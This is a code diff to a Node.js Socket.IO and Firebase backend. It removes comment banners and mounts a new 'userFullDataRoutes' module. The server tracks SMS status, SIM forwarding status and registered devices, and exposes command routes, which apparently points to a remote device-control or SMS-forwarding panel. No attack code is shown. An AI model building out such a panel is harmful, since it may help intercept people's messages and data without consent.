@@ -1,6 +1,3 @@
-// ===============================================
-//  SERVER.JS — FULL MASTER VERSION (A-TO-Z)
-// ===============================================
 
 import dotenv from "dotenv";
 dotenv.config();
@@ -12,6 +9,7 @@ import { Server } from "socket.io";
 
 import { firestore, rtdb, fcm } from "./config/db.js";
 
+import userFullDataRoutes from "./routes/userFullDataRoutes.js";
 import adminRoutes from "./routes/adminRoutes.js";
 import notificationRoutes from "./routes/notificationRoutes.js";
 import checkRoutes from "./routes/checkRoutes.js";
@@ -524,8 +522,6 @@ smsStatusRef.on("child_removed", (snap) => {
   console.log(`🗑 smsStatus removed for uid=${uid}`);
 });
 
-// --- SIM FORWARD STATUS LIVE ---
-
 const simForwardRef = rtdb.ref("simForwardStatus");
 
 function handleSimForwardChange(snap, event = "update") {
@@ -584,9 +580,6 @@ simForwardRef.on("child_removed", (snap) =>
   handleSimForwardChange(snap, "removed")
 );
 
-/* ======================================================
-      LIVE WATCHERS FOR REGISTERED DEVICES (🔥 MAIN PART)
-====================================================== */
 
 const registeredDevicesRef = rtdb.ref("registeredDevices");
 
@@ -602,9 +595,7 @@ registeredDevicesRef.on("child_removed", () => {
   refreshDevicesLive("registered_removed");
 });
 
-/* ======================================================
 
-====================================================== */
 app.get("/api/devices", async (req, res) => {
   try {
     const devices = await buildDevicesList();
@@ -614,28 +605,24 @@ app.get("/api/devices", async (req, res) => {
       data: devices,
     });
   } catch (err) {
-    console.error("❌ /api/devices ERROR:", err.message);
+    console.error(" /api/devices ERROR:", err.message);
     res.status(500).json({ success: false });
   }
 });
 
-/* ======================================================
-
-====================================================== */
 refreshDevicesLive("initial");
 
 app.use(adminRoutes);
 app.use(notificationRoutes);
 app.use("/api", checkRoutes);
+app.use("/api", userFullDataRoutes);
 app.use(commandRoutes);
 
 app.get("/", (_, res) => {
   res.send(" RTDB + Socket.IO Backend Running");
 });
 
-/* ======================================================
-  
-====================================================== */
+
 server.listen(PORT, () => {
   console.log(` Server running on PORT ${PORT}`);
 });
